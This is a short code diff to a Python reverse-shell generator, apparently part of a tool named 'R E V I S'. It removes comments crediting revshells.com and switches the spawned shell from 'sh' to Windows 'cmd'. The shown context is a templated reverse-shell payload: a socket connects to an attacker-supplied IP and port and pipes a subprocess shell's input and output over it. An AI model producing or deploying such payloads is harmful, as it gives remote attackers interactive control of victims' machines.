@@ -1,6 +1,3 @@
-# Reverse shells for R E V I S. 
-# Please NOTE: I did not make these reverse shells, I generated them using this website: https://www.revshells.com/
-
 import string
 from random import randrange 
 import random
@@ -30,7 +27,7 @@ def p2s(s, p):
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{ip_addr}",{port}))
 
-p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
 s2p_thread = threading.Thread(target=s2p, args=[s, p])
 s2p_thread.daemon = True
